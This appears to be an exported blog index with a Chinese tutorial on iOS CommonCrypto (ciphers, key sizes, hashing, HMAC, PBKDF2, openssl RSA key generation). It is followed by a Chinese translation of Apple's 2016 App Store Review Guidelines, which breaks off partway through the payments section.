kCCAlgorithmAES128  Advanced Encryption Standard, 128-bit block                                    This is kept for historical reasons.  It&#x27;s                                    preferred now to use kCCAlgorithmAES since                                    128-bit blocks are part of the standard.    @constant   kCCAlgorithmAES     Advanced Encryption Standard, 128-bit block    @constant   kCCAlgorithmDES     Data Encryption Standard    @constant   kCCAlgorithm3DES    Triple-DES, three key, EDE configuration    @constant   kCCAlgorithmCAST    CAST \t@constant   kCCAlgorithmRC4     RC4 stream cipher \t@constant   kCCAlgorithmBlowfish    Blowfish block cipher*/enum &#123;    kCCAlgorithmAES128 = 0,    kCCAlgorithmAES = 0,    kCCAlgorithmDES,    kCCAlgorithm3DES,           kCCAlgorithmCAST,           kCCAlgorithmRC4,    kCCAlgorithmRC2,       kCCAlgorithmBlowfish    &#125;;typedef uint32_t CCAlgorithm;\n\nCCOptions：配置选项/*!    @enum       CCOptions    @abstract   Options flags, passed to CCCryptorCreate().    @constant   kCCOptionPKCS7Padding   Perform PKCS7 padding.    @constant   kCCOptionECBMode        Electronic Code Book Mode.                                        Default is CBC.*/enum &#123;    /* options for block ciphers */    kCCOptionPKCS7Padding   = 0x0001,    kCCOptionECBMode        = 0x0002    /* stream ciphers currently have no options */&#125;;typedef uint32_t CCOptions;\n\nPKCS：Public Key Cryptography Standards，公钥加密标准\nPKCS7：密码消息语法标准（Cryptographic Message Syntax Standard）\nECB：电子密码本（Electronic codebook，ECB）模式。需要加密的消息按照块密码的块大小被分为数个块，并对每个块进行独立加密。\n\nCBC：在CBC模式中，每个平文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有平文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量。\n\nkey、keyLength：密钥长度密钥长度必须为指定的长度。\nenum &#123;    kCCKeySizeAES128          = 16,    kCCKeySizeAES192          = 24,    kCCKeySizeAES256          = 32,    kCCKeySizeDES             = 8,    kCCKeySize3DES            = 24,    kCCKeySizeMinCAST         = 5,    kCCKeySizeMaxCAST         = 16,    kCCKeySizeMinRC4          = 1,    kCCKeySizeMaxRC4          = 512,    kCCKeySizeMinRC2          = 1,    kCCKeySizeMaxRC2          = 128,    kCCKeySizeMinBlowfish     = 8,    kCCKeySizeMaxBlowfish     = 56,&#125;;\n\niv：初始化向量（可选）初始化向量（IV，Initialization Vector）是许多工作模式中用于随机化加密的一块数据，因此可以由相同的明文，相同的密钥产生不同的密文，而无需重新产生密钥，避免了通常相当复杂的这一过程。\n用于CBC模式。如果存在，必须和选择算法的block size一样长。\n如果使用ECB模式或者使用流式密码算法将自动忽略。\nByte iv[] = &#123;0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF&#125;;\ndataIn、dataInLength：要加密或解密的数据dataOut、dataOutAvailable：加密或解密后的输出数据创建对应算法需要的输出数据字节大小。输出数据的bufferSize足够大，大约要加密数据的长度+kCCBlockSize长度。\n示例如下，DES加密解密需要的内存块大小。\nsize_t bufferSize = [data length] + kCCBlockSizeDES;void *buffer = malloc(bufferSize);\n\n/*!    @enum           Block sizes    @discussion     Block sizes, in bytes, for supported algorithms.    @constant kCCBlockSizeAES128    AES block size (currently, only 128-bit                                    blocks are supported).    @constant kCCBlockSizeDES       DES block size.    @constant kCCBlockSize3DES      Triple DES block size.    @constant kCCBlockSizeCAST      CAST block size.*/enum &#123;    /* AES */    kCCBlockSizeAES128        = 16,    /* DES */    kCCBlockSizeDES           = 8,    /* 3DES */    kCCBlockSize3DES          = 8,    /* CAST */    kCCBlockSizeCAST          = 8,    kCCBlockSizeRC2           = 8,    kCCBlockSizeBlowfish      = 8,&#125;;\n\ndataOutMoved成功时，返回写入到dataOut内存块中字节数。\nkCCBufferTooSmall时，返回需要提供不足的内存空间大小。\nCCCryptorStatus：返回加密&#x2F;解密状态enum &#123;    kCCSuccess          = 0,    kCCParamError       = -4300,    kCCBufferTooSmall   = -4301,    kCCMemoryFailure    = -4302,    kCCAlignmentError   = -4303,    kCCDecodeError      = -4304,    kCCUnimplemented    = -4305,    kCCOverflow         = -4306,    kCCRNGFailure       = -4307,&#125;;\n\n\n公钥密码——用公钥加密，用私钥解密公钥密码（public-key cryptography）中，密钥分为加密密钥和解密密钥两种，发送者用加密密钥对消息进行加密，接收者用解密密钥对密文进行解密。\n仔细思考一下加密密钥和解密密钥的区别，我们可以发现：\n\n发送者只需要加密密钥\n接收者只需要解密密钥\n解密密钥不可以被窃听者获取\n加密密钥被窃听者获取也没问题\n\n公钥密码中，加密密钥一般是公开的。正是由于加密密钥可以任意公开，因此该密钥被称为公钥（public key）。当然，我们也没有必要将公钥公开给全世界所有的人，但至少我们需要将公钥发送给需要使用公钥进行加密的通信对象（也就是给自己发送密文的发送者）。\n相对地，解密密钥是绝对不能公开的，这个密钥只能由你自己来使用，一次成为私钥（private key）。私钥不可以被别人知道，也不可以将它发送给别人，甚至也不能发送给自己的通信对象。\n公钥和私钥是一一对应的，一对公钥和私钥统称为密钥对（key pair），由公钥进行加密的密文，必须使用与该公钥配对的私钥才能够解密。密钥对中的两个密钥之间具有非常密切的关系——数学上的关系——因此公钥和私钥是不能分别单独生成的。\n公钥密码的使用者需要生成一个包括公钥和私钥的密钥对，其中公钥会发送给别人，而私钥则仅供自己使用。\n常见的公钥加密算法有：RSA、ElGamal、背包算法、Rabin（RSA的特例）、迪菲－赫尔曼密钥交换协议中的公钥加密算法、椭圆曲线加密算法（英语：Elliptic Curve Cryptography, ECC）。使用最广泛的是RSA算法（由发明者Rivest、Shmir和Adleman姓氏首字母缩写而来）是著名的公开金钥加密算法，ElGamal是另一种常用的非对称加密算法。\nRSA加密算法是一种非对称加密算法。在公开密钥加密和电子商业中RSA被广泛使用。\nRSA密钥生成命令// 生成RSA私钥$ openssl genrsa -out rsa_private_key.pem 1024// 生成RSA公钥$ openssl rsa -in rsa_private_key.pem -pubout -out rsa_public_key.pem// 将RSA私钥转换成PKCS8格式openssl pkcs8 -topk8 -inform PEM -in rsa_private_key.pem -outform PEM -nocrypt\n\n单向散列函数——获取消息的『指纹』散列函数（或散列算法，又称哈希函数，英语：Hash Function）是一种从任何一种数据中创建小的数字“指纹”的方法。散列函数把消息或数据压缩成摘要，使得数据量变小，将数据的格式固定下来。该函数将数据打乱混合，重新创建一个叫做散列值（hash values，hash codes，hash sums，或hashes）的指纹。散列值通常用来代表一个短的随机字母和数字组成的字符串。好的散列函数在输入域中很少出现散列冲突。在散列表和数据处理中，不抑制冲突来区别数据，会使得数据库记录更难找到。\n\n单向散列函数，就是把任意长的输入消息串变化成固定长的输出串且由输出串难以得到输入串的一种函数。这个输出串称为该消息的散列值。\n术语单向散列函数：也称为消息摘要函数（message digest function），哈希函数或者杂凑函数。\n输入单向散列函数的消息也称为原像（pre-image）。\n单向散列函数输出的散列值也称为消息摘要（message digest）或者指纹（fingerprint）。\n完整性也称为一致性。\n性质\n根据任意长度的消息计算出固定长度的散列值首先，单向散列函数的输入必须能够使任意长度的消息。其次，无论输入多长的消息，单向散列函数必须都能够生成长度很短的散列值，散列值的长度最好是短且固定的。\n\n能够快速计算出散列值\n消息不同散列值也不同当给定某条消息的散列值时，单向散列函数必须确保要找到和该条消息具备相同散列值的另外一条消息是非常困难的。这一性质称为『弱抗碰撞性』。单向散列函数都必须具备弱抗碰撞性。\n和弱抗碰撞性相对的，还有强抗碰撞性，所谓强抗碰撞性，是指要找到散列值相同的两条不同的消息是非常困难的。在这里，散列值可以是任意值。\n\n具备单向性单向散列函数必须具备单向性，单向性指的是无法通过散列值反算出消息的性质。\n\n\n应用场景\n检测软件是否被篡改\n基于口令的加密单向散列函数也被用于基于口令的加密（Password Based Encryption, PBE）\nPBE的原理是将口令和盐（salt，通过伪随机数生成器产生的随机值）混合后计算其散列值，然后将这个散列值用作加密的密钥。\n\n消息认证码消息认证码是将『发送者和接收者之间的共享密钥』和『消息』进行混合后计算出的散列值。使用消息认证码可以检测并防止通信过程中的错误、篡改以及伪装。\n\n数字签名数字签名是现实社会中的签名（sign）和盖章这样的行为在数字世界中实现。数字签名的处理过程非常耗时，一次一般不会对整个消息内容直接施加数字签名，而是先通过单向散列函数计算出消息的散列值，然后再对这个散列值施加数字签名。\n\n伪随机数生成器密码技术中所使用的随机数需要具备『事实上不可能根据过去的随机数列预测未来的随机数列』这样的性质。为了保证不可预测性，可以利用单向散列函数的单向性。\n\n一次性口令一次性口令经常被用于服务器对客户端的合法性认证。在这种方式中，通过使用单向散列函数可以保证口令只在通信链路上传送一次，因此即使窃听者窃取了口令，也无法使用。\n\n\nMD5MD5消息摘要算法（英语：MD5 Message-Digest Algorithm），一种被广泛使用的密码散列函数，可以产生出一个128位（16字节）的散列值（hash value），用于确保信息传输完整一致。\nPS：已发现碰撞。\n应用场景MD5已经广泛使用在为文件传输提供一定的可靠性方面。例如，服务器预先提供一个MD5校验和，用户下载完文件以后，用MD5算法计算下载文件的MD5校验和，然后通过检查这两个校验和是否一致，就能判断下载的文件是否出错。\nMD5亦有应用于部分网上赌场以保证赌博的公平性，原理是系统先在玩家下注前已生成该局的结果，将该结果的字符串配合一组随机字符串利用MD5 加密，将该加密字符串于玩家下注前便显示给玩家，再在结果开出后将未加密的字符串显示给玩家，玩家便可利用MD5工具加密验证该字符串是否吻合。\n例子: 在玩家下注骰宝前，赌场便先决定该局结果，假设生成的随机结果为4、5、 6大，赌场便会先利用MD5 加密“4, 5, 6”此字符串并于玩家下注前告诉玩家；由于赌场是无法预计玩家会下什么注，所以便能确保赌场不能作弊；当玩家下注完毕后，赌场便告诉玩家该原始字符串，即“4, 5, 6”，玩家便可利用MD5工具加密该字符串是否与下注前的加密字符串吻合。\n该字符串一般会加上一组随机字符串 (Random string)，以防止玩家利用碰撞 (Collision) 解密字符串，但如使用超级电脑利用碰撞亦有可能从加上随机字符串的加密字符串中获取游戏结果。随机字符串的长度与碰撞的次数成正比关系，一般网上赌场使用的随机字符串是长于20字，有些网上赌场的随机字符串更长达500字，以增加解密难度。\nMD5代码实现/*** MD5 ***/#define CC_MD5_DIGEST_LENGTH    16          /* digest length in bytes */#define CC_MD5_BLOCK_BYTES      64          /* block size in bytes */unsigned char *CC_MD5(const void *data, CC_LONG len, unsigned char *md)\n\n参考链接\nhttps://zh.wikipedia.org/wiki/MD5\n\nSHA家族安全散列算法（英语：Secure Hash Algorithm，缩写为SHA）是一个密码散列函数家族，是FIPS所认证的五种安全散列算法。能计算出一个数字消息所对应到的，长度固定的字符串（又称消息摘要）的算法。且若输入的消息不同，它们对应到不同字符串的概率很高。这些算法之所以称作“安全”是基于以下两点（根据官方标准的描述）：\n\n由消息摘要反推原输入消息，从计算理论上来说是很困难的。\n想要找到两组不同的消息对应到相同的消息摘要，从计算理论上来说也是很困难的。任何对输入消息的变动，都有很高的概率导致其产生的消息摘要迥异。\n\nSHA家族的五个算法，分别是SHA-1、SHA-224、SHA-256、SHA-384，和SHA-512，由美国国家安全局（NSA）所设计，并由美国国家标准与技术研究院（NIST）发布；是美国的政府标准。后四者有时并称为SHA-2。SHA-1在许多安全协议中广为使用，包括TLS和SSL、PGP、SSH、S&#x2F;MIME和IPsec，曾被视为是MD5（更早之前被广为使用的散列函数）的后继者。但SHA-1的安全性如今被密码学家严重质疑；虽然至今尚未出现对SHA-2有效的攻击，它的算法跟SHA-1基本上仍然相似；因此有些人开始发展其他替代的散列算法。缘于最近[何时？]对SHA-1的种种攻击发表，“美国国家标准与技术研究院（NIST）开始设法经由公开竞争管道（类似高级加密标准AES的发展经过），发展一个或多个新的散列算法。”\n\n\nSHA代码实现SHA-1/*** SHA1 ***/#define CC_SHA1_DIGEST_LENGTH   20          /* digest length in bytes */#define CC_SHA1_BLOCK_BYTES     64          /* block size in bytes */unsigned char *CC_SHA1(const void *data, CC_LONG len, unsigned char *md)\n\nSHA-224/*** SHA224 ***/#define CC_SHA224_DIGEST_LENGTH     28          /* digest length in bytes */#define CC_SHA224_BLOCK_BYTES       64          /* block size in bytes */unsigned char *CC_SHA224(const void *data, CC_LONG len, unsigned char *md)\n\nSHA-256/*** SHA256 ***/#define CC_SHA256_DIGEST_LENGTH     32          /* digest length in bytes */#define CC_SHA256_BLOCK_BYTES       64          /* block size in bytes */unsigned char *CC_SHA256(const void *data, CC_LONG len, unsigned char *md)\n\nSHA-384/*** SHA384 ***/#define CC_SHA384_DIGEST_LENGTH     48          /* digest length in bytes */#define CC_SHA384_BLOCK_BYTES      128          /* block size in bytes */unsigned char *CC_SHA384(const void *data, CC_LONG len, unsigned char *md)\n\nSHA-512/*** SHA512 ***/#define CC_SHA512_DIGEST_LENGTH     64          /* digest length in bytes */#define CC_SHA512_BLOCK_BYTES      128          /* block size in bytes */unsigned char *CC_SHA512(const void *data, CC_LONG len, unsigned char *md)\n\n参考链接\nhttps://zh.wikipedia.org/wiki/散列函數\n在线工具\n\n消息认证码基本概念消息认证码（message authentication code）是一种确认完整性并进行认证的技术，简称『MAC』。\n消息认证码的输入包括任意长度的消息和一个发送者与接收者之间共享的密钥，他可以输出固定长度的数据，这个数据称为MAC值。\n使用SHA-1、MD5之类的单向散列函数可以实现消息认证码，其中一种实现方法称为HMAC。\n密钥散列消息认证码（英语：Keyed-hash message authentication code，缩写为HMAC），又称散列消息认证码（Hash-based message authentication code），是一种通过特别计算方式之后产生的消息认证码（MAC），使用密码散列函数，同时结合一个加密密钥。它可以用来保证数据的完整性，同时可以用来作某个消息的身份验证。\nHMAC的应用hmac主要应用在身份验证中，它的使用方法是这样的：(1) 客户端发出登录请求（假设是浏览器的GET请求）(2) 服务器返回一个随机值，并在会话中记录这个随机值(3) 客户端将该随机值作为密钥，用户密码进行hmac运算，然后提交给服务器(4) 服务器读取用户数据库中的用户密码和步骤2中发送的随机值做与客户端一样的hmac运算，然后与用户发送的结果比较，如果结果一致则验证用户合法。\n在这个过程中，可能遭到安全攻击的是服务器发送的随机值和用户发送的hmac结果，而对于截获了这两个值的黑客而言这两个值是没有意义的，绝无获取用户密码的可能性，随机值的引入使hmac只在当前会话中有效，大大增强了安全性和实用性。\nHMAC实现void CCHmac(    CCHmacAlgorithm algorithm,  /* kCCHmacSHA1, kCCHmacMD5 */    const void *key,    size_t keyLength,           /* length of key in bytes */    const void *data,    size_t dataLength,          /* length of data in bytes */    void *macOut)               /* MAC written here */\n\n参考链接\n密钥散列消息认证码——维基百科\n\nKey Derivation（密钥导出）PBKDF2(Password-Based Key Derivation Function)是一个用来导出密钥的函数，常用于生成加密的密码。\n它的基本原理是通过一个伪随机函数（例如HMAC函数），把明文和一个盐值作为输入参数，然后重复进行运算，并最终产生密钥。\n如果重复的次数足够大，破解的成本就会变得很高。而盐值的添加也会增加“彩虹表”攻击的难度。\nPBKDF2函数的定义DK &#x3D; PBKDF2(PRF, Password, Salt, c, dkLen)PRF是一个伪随机函数，例如HASH_HMAC函数，它会输出长度为hLen的结果。Password是用来生成密钥的原文密码。Salt是一个加密用的盐值。c是进行重复计算的次数。dkLen是期望得到的密钥的长度。DK是最后产生的密钥。\nPBKDF代码实现int CCKeyDerivationPBKDF( CCPBKDFAlgorithm algorithm, const char *password, size_t passwordLen,                      const uint8_t *salt, size_t saltLen,                      CCPseudoRandomAlgorithm prf, uint rounds,                      uint8_t *derivedKey, size_t derivedKeyLen)\n\n\n随机数生成CCRNGStatus CCRandomGenerateBytes(void *bytes, size_t count)\n\n\nSymmetric Key WrapWrap a symmetric key with a Key Encryption Key (KEK).\nint  CCSymmetricKeyWrap( CCWrappingAlgorithm algorithm,                   const uint8_t *iv, const size_t ivLen,                   const uint8_t *kek, size_t kekLen,                   const uint8_t *rawKey, size_t rawKeyLen,                   uint8_t  *wrappedKey, size_t *wrappedKeyLen)\n\n\n第三方库\nhttps://github.com/kelp404/CocoaSecurity\n\n","categories":["iOS"],"tags":["Cryptography","密码技术"]},{"title":"App Store 审核指南——2016.6","url":"/2016/06/24/AppStore-Review-Guidelines/","content":"提交应用之前的检查列表为了帮助你的应用能够尽可能顺利的过审，请查看下面列出来的可能降低审核速度或者被拒绝的常见失误。本清单无法代替审核条款，但你需要确保你已经达到了清单的要求作为良好的开始。\n确保你已经：\n\n测试你的应用程序，保证它不会发生崩溃和错误\n\n确保你的应用程序的信息和应用内容保持完整和准确\n\n保证联系人信息始终有效，审核团队可以及时联系到你\n\n提供一个有效的测试帐号以及登录信息，并提供测试功能必要的的硬件和资源（例如，一个测试用的二维码）\n\n保证后台服务在审核期间运行正常\n\n如果应用的某些功能和应用内付费隐藏较深，需提供详细的描述文档和支持文档。如果因为地域的原因我们无法正常使用该功能，请提供该功能的描述视频链接。\n\n请检查你的应用程序是否符合其他规范，包括（注意文中部分内容也有对应的条款和说明，请注意查看）\n开发指南应用程序编程指南（App Programming Guide）应用扩展编程指南（App Extension Programming Guide）iOS数据存储条款（iOS Data Storage Guidelines）Mac OS X文件系统文档（Mac OS X File System Documentation）Safari扩展开发指南（Safari Extensions Development Guide）iTunes Connect开发指南（iTunes Connect Developer Guide）\n设计指南iOS人机交互界面条款（iOS Human Interface Guidelines）Mac OS人机交互界面条款（Mac OS Human Interface Guidelines）tvOS人机交互界面条款（tvOS Human Interface Guidelines）watchOS人机交互界面条款（watchOS Human Interface Guidelines）\n品牌营销指南App Store市场营销条款（App Store Marketing Guidelines）苹果支付身份条款（Apple Pay Identity Guidelines）加入苹果支付许可条款（Add to Apple Wallet Guidelines）使用Apple商标和版权的条款（Guidelines for Using Apple Trademarks and Copyrights）\n\n\n\n安全当用户从App Store安装应用的时候，他们需要确认这样的操作是安全的。所以应用程序不能包含令人不快或者冒犯性的内容，而且使用中不会造成身心伤害。我们列出了常见的几种缺陷，如果你的应用准备冒犯用户或者与用户发生冲突，App Store不是你的应用应该上架的地方。\n1.1不当内容应用程序不应该包括攻击性，敏感，令人不悦，侮辱或者品味低下的内容。例如：\n1.1.1 诽谤或者人格侮辱的内容，包括引用或者评论宗教、种族、性取向、性别或者其他目标群体的内容，特别是该应用对特定的人群造成了伤害（只有专业的政治讽刺作家和幽默大师才不会受到此限制）。\n1.1.2 对人或动物被杀害、致残、折磨、虐待的逼真的描述或者具有暴力倾向的内容。如果是游戏，那么其中的敌人不能只针对特定的种族、文化、政府、公司以及任何其他实体。\n1.1.3 鼓励人们非法或者轻率使用武器和危险品的内容，或者方便人们购买枪支的内容。\n1.1.4 公开的性爱或色情的内容。根据韦氏词典（Webster’s Dictionary）的定义，这些内容特指“明确的描述或展示性器官，或者目的在于激发人们的性欲，而不是展示美学或者渲染气氛”。\n1.1.5 煽动宗教仇恨或者对宗教文献的误导性和不准确的引用。\n1.1.6 提供虚假信息和虚假功能，包括提供不正确的设备信息，提供恶作剧的功能例如虚假的位置跟踪工具。即便是明确指出该应用程序是出于娱乐性的目的也不会无视该条款。发送匿名虚假诈骗信息或者拨打恶意电话的应用会被直接拒绝。\n1.2 用户生成的内容为了防止非法滥用用户生成的内容，从而给用户提供虚假信息、盗取用户的知识产权，社交应用以及应用当中包含用户生成的信息的应用必须包括下述功能：\n\n过滤不良内容\n提供举报机制\n后台服务可以提供阻止骚扰用户的行为\n提供官方联系方式，让用户可以快速联系到开发商\n\n如果应用在使用用户生成的内容或者提供服务的时候，主要目的是发布色情内容，人肉搜索、侮辱用户，人身威胁、恐吓用户，这种应用不应该放在应用商店，而且苹果可能会不通知开发商并直接下架。如果你的应用使用用户生成的信息来提供网络服务，并且网页上包含了一些限制级的内容，需要默认隐藏并且提供明显的NSFW（不适合工作场所）标识，用户主动点击才会显示。\n1.3 儿童分类儿童分类是人们找到适合儿童的应用的良好方式。如果你希望你的应用上架到这个类别当中，你需要关注并且在设计应用的时候需要照顾到儿童的良好体验。这些应用程序不可以包括指向其他应用的链接，付费入口以及其他可能会吸引儿童的不适合的内容，除非提供给家长监控和开启的能力。请记住，一旦客户期望你的应用程序遵循儿童类别的要求，那么它需要进行不断的修改从而满足后续版本的儿童类别的条款更新。即便是你打算取消发布在儿童类别当中也一样需要遵守这些条款。点此了解家长监控的更多内容。\n儿童类别的应用不允许包括基于用户行为的广告（也就是这种广告会根据用户行为而决定展示什么样的内容）。如果包含了广告，这些广告必须也适合儿童。与此同时，你也需要特别留意世界各地有关在线收集儿童数据的相关法律法规。请务必查看本条款的隐私条款来了解更多的相关信息。\n1.4 人身伤害如果你的应用程序可能会危害到人身安全，我们可能会拒绝掉它。这类情况包括：\n1.4.1 如果你的应用属于医疗范畴，那我们将会对这个应用提供用于医疗诊断的信息的准确性进行更加严格的审查。如果你的医疗应用已经获得了相关监管部门的批准，你需要随同你的应用一并提供指向相关批准文档的链接用于审核\n1.4.2 药物剂量计算器必须来自药物生产企业、医院、高校、健康保险公司以及其他具有合法资质的实体。或者你的计算方法已经获得了FDA或其他国际上的同行的认可。考虑到潜在的人身伤害的危险，我们需要确保你的应用会长期获得更新和支持\n1.4.3 应用程序不允许鼓励人们非法摄入过量的酒精或药物，或者鼓励未成年人消费药物、酒精和烟草。与此同时，严禁销售大麻等毒品。\n1.4.4 应用程序只能显示执法机构提供的酒后驾驶检查站，而且不允许鼓励人们进行危险的行为，包括酒驾、超速。\n1.4.5 应用程序禁止强迫人们采用违背苹果硬件的安全文档的方式，包括冒着设备损坏或者造成人身伤害的危险使用他们的设备。例如，应用程序不应该鼓励人们将设备塞到床垫下面或枕头下面充电。\n1.5 开发者信息用户需要了解当他们遇到问题的时候该如何与您联系。确保你提供的链接当中包含了使用户找到你的非常方便的方法。如果联系人信息不准确或者过期，这不仅令用户失望，在有些国家和地区这也属于违法行为。与此同时，确保支付许可包含发行商的有效联系信息，并且这些信息采用分配给发行商的来自权威机构的合法的根证书进行签名。\n性能2.1 应用程序的完整性提审版本的应用必须是最终版本，并且包含了所有应用内容以及所有有效链接。应用在提交的时候需要清除掉所有占位符、无效地址和临时内容。确保你的应用在提交审核之前经过充分测试并且没有BUG，如果你的应用需要登陆，需要包含一个合法的账户而且对应的后台服务也是正常有效的。如果你的应用包含应用内付费，确保他们是完整的，最新的，并且审核人员可以很容易找到。如果不可以，需要提供明确的解释为何不行。请不要把应用程序审核当作软件测试服务，如果你的应用不完整或者存在明显的技术缺陷，它将直接被拒绝。\n2.2 Beta版测试您的应用程序的测试版本不应该上架到应用商店，请使用Testflight来代替。如果你的应用提交到Testflight Beta，那么这个应用已经准备好对外发布，并且符合应用审核条款。请注意，Testflight版本的应用不允许从测试人员当中获取任何利益，包括来自众筹的资金。你应该对测试人员提供明确的更新说明。请通过Testflight Beta测试说明了解更多信息。\n2.3 应用内容的准确性客户在下载你的应用的时候需要明确了解你的应用是什么，所以请确保你的应用描述、截图、预览视频始终是最新版本，并且能够准确反映你的应用。\n2.3.1 不要在你的应用当中包含任何隐藏和没有相关说明文档的功能。你的应用程序的功能必须让用户和审核人员了解清楚。如果这样的行为过分或者反复出现，你可能会被苹果从开发者身份当中除名。我们努力确保App Store是一个令人信赖的生态系统，并且期望每一个开发者也能够遵守这种要求。如果你没有信誉，我们不想和你合作。\n2.3.2 如果你的应用程序包含了应用内付费功能，请确保你的应用程序的描述、截图和预览视频能够明确表明哪些功能、关卡、订阅内容等需要额外购买。\n2.3.3 你的截图必须符合你的应用程序的实际内容，而不是标题艺术，登陆界面和闪屏界面。\n2.3.4 你的预览视频是让用户能够快速了解你的应用是用来做什么的好方法。为了确保人们可以清楚的了解他们将会在你的应用当中获得什么内容，你的预览视频必须从应用程序本身的运行效果当中捕获。你可以添加旁白或者文本描述来帮助解释视频本身无法解释清楚的内容。\n2.3.5 你需要遵守App Store的类别定义，并且为你的应用选择最合适的类别。如果你选择的类别不符合你的应用，我们可能会帮助你改变应用类别。\n2.3.6 你必须诚实的回答iTunes Connect上面提供的年龄分级的问题，从而你的应用可以良好的使用家长控制功能。如果你的应用年龄分级不正确，用户可能会对你的应用程序的行为表示十分意外，这也可能导致某些国家和地区的监管部门对你的应用分级不正确的问题开展调查。\n2.3.7 你需要创建一个独一无二的应用名称，设计一套准确描述你的应用的关键词。不要尝试使用商标术语、流行的应用名称以及其他不相关的词语来包装你的应用。苹果可能随时修改不恰当的关键词。\n2.3.8 你的应用内容应该适合所有的用户，所以一定要确保你的应用图标、截图和预览视频能够准确的反映你的应用。即使你的应用程序年龄分级高于4+，你的图标、截图和预览视频也必须符合4+的年龄分级。例如你的应用是一个游戏，并且具有暴力内容，你必须选择一个不反映死亡、枪决的截图放到应用商店当中。记住确保你的应用内容，包括应用名称和图标（小图标、大图标、Apple Watch图标等）是一致的从而防止用户感到迷惑。\n2.3.9 开发商具有保证版权合法的责任，包括应用程序图标，截图，预览视频的版权。图标、截图和预览视频需要使用一个虚构的账户的信息，而不是一个真实的用户信息。\n2.4 硬件兼容性2.4.1 为了确保人们可以尽可能充分的体验你的应用，在可能的情况下iPhone应用也可以完美支持iPad。我们鼓励您建立通用的应用，使得用户可以在不同的设备上使用。\n2.4.2 你的应用需要高效的利用电量。应用程序不应该快速的消耗电池电量并且产生过多的热量，或者对用户的设备造成不必要的负担。\n2.4.3 你的Apple TV应用可以在只有Siri遥控器或者游戏手柄的时候可以正常运行，但我们不反对你通过更多的外围设备增强你的应用功能的做法。如果你需要一个游戏控制器，请确保在游戏当中对这个游戏控制器提供明确的教程，从而让用户知道如何使用这个控制器。\n2.4.4 应用程序不应该建议或者要求设备重新启动。\n2.4.5 通过Mac App Store发布的应用还需要遵守额外的要求：\n（i）它们必须适当的被沙盒化，而且遵守Mac OS文件系统文档。这些应用也必须通过对应的Mac OSAPI来修改其他应用的数据（例如书签、地址簿和日历）。\n（ii）必须使用Xcode对应用进行打包，不允许包含第三方的安装程序。它们必须是自我包含的、单一文件的安装包，而且不能在共享的位置安装代码和解压资源。\n（iii）在未经用户允许的情况下不允许自动启动或者开机启动，而且用户退出应用之后不允许在未经用户同意的情况下残留后台进程。应用不允许自动将图标放在Dock或者用户桌面。\n（iv）应用程序不允许私自下载和安装其他应用，驱动，额外的代码，以及添加应用功能或者明显改变与审核版本的应用不同的应用工作方式的资源文件。\n（v）应用程序不允许要求升级到root权限，或者使用setuid属性来升级权限。\n（vi）这些应用运行的时候不允许弹出要求许可证的窗口，或者其他的显示方式来反盗版（应用商店允许付费并视为购买了正版授权）。\n（vii）必须使用Mac App Store发布更新，其他方式不被允许。\n（viii）应用程序仅在在当前版本的系统就可以运行，不允许使用可选安装的技术或者废弃过时的技术（例如Java, Rosetta等）\n（ix）所有的本地化版本必须包含在同一个应用程序包下。\n2.5 软件要求2.5.1 应用程序只能使用公共API，不允许使用私有API。\n2.5.2 应用程序bundle当中需要是自包含的，不允许读写它们设计的容器之外的数据，并且不得下载、安装或执行代码，包括其他iOS，watchOS，macOS和tvOS的应用。\n2.5.3 如果应用程序传播病毒、文件、计算机代码或者其他可能损坏操作系统和硬件的功能，包括消息推送和游戏中心，将被拒绝。如果这种行为十分恶劣而且反复出现，开发者可能会被苹果除名。\n2.5.4 多任务的应用只能在预期目的下运行后台服务，例如网络电话、音频播放、定位服务、任务计划、本地通知等。如果你的应用程序使用了定位服务，需要提供一个明确的提醒告诉用户这么做会加快电量消耗。\n2.5.5 我们会在IPv6网络上审核你的应用，所以如果你的应用程序无法使用IPv6协议，可能会被拒绝。\n2.5.6 应用程序如果浏览网络，必须使用WebKit框架和WebKit Javascript标准。\n2.5.7 使用蜂窝数据网络播放的视频如果超过10分钟，必须使用HTTP Live Streaming技术并且提供192kbps的码率选项。\n2.5.8 改动用户桌面&#x2F;home界面环境体验的应用，以及模拟多应用小工具使用体验的的应用将会被拒绝。\n2.5.9 应用程序如果修改了标准开关的功能，例如音量上下键和响铃开关，或者其他原生用户界面元素和行为将会被拒绝。\n2.5.10 应用程序在提交的时候不允许包含一个空的广告栏或者测试广告。\n业务你的应用可以在App Store当中有多种方式赚钱。如果你的应用的商业模式不够明显，请在应用内容或者审核备注当中提供商业化描述。如果你的应用程序的行为我们无法理解，或者你的应用内付费入口不够明显，将会使得你的应用审核速度变慢甚至被拒绝。尽管定价权在你，但是如果你的应用或者应用内付费存在明显的敲竹杠的行为，我们也会拒绝发布这个应用或者这个应用内付费。我们会拒绝掉视图以不正常的高价格欺骗用户的昂贵的应用。\n如果我们发现你视图诱导用户给较高评价等操纵评价的行为，例如通过支付来诱导、过滤不良评价、通过水军刷虚假评价或者通过第三方的公司或团队代表您进行这类操作，我们会采取措施来维护App Store的环境，其中可能包括将你从开发人员当中除名。\n3.1 付款3.1.1 应用内付费：如果你希望通过付费才可以解锁你的应用当中的一些功能（例如，订阅内容，游戏货币，游戏关卡，获取优质内容，解锁完整版本），你必须使用应用内付费（IAP）。应用程序不允许包括按钮、链接或者其他调用方式和行为指导用户采用非IAP的方式付费。通过IAP购买的游戏内的虚拟货币或积分必须只能在这个应用内才可以消费，不能过期，你应该确保你的应用针对具有可恢复的应用内付费具有恢复应用内付费的购买状态的功能和机制。如果你的应用内付费的付费类型不正确，你的应用会被拒绝。应用不可以直接或间接使用应用内付费的内容和功能向其他用户赠送礼品。在Mac应用商店发布的APP需要使用其他机制或者包含一个插件而不是应用商店本身来完成这样的赠送功能。\n3.1.2 订阅：自动更新的订阅只能使用应用内付费来提供，并且只能用于期刊（例如报杂志），商业应用（例如企业、生产力、专业创作和云存储），媒体应用（例如视频，音频，语音和照片共享），以及其他批准的服务（例如约会计划、食谱管理和天气预报）。这些订阅必须持续不少于7天，而且从这款应用可以运行的用户的所有的设备当中都可以获取。你可能会提供跨应用程序的丁芸，但这些订阅内容不允许再扩展到第三方的应用或服务。\n3.1.3 基于内容的“阅读”应用：应用可以允许用户访问他们之前购买的内容或者订阅的内容（比如报纸、杂志、书籍、音频，音乐，视频，专业的数据库，网络电话，云存储以及其他被批准的服务例如管理学生成绩和课程表的教育应用）。应用程序提供商不允许指引用户采用IAP之外的付费机制付费。\n3.1.4 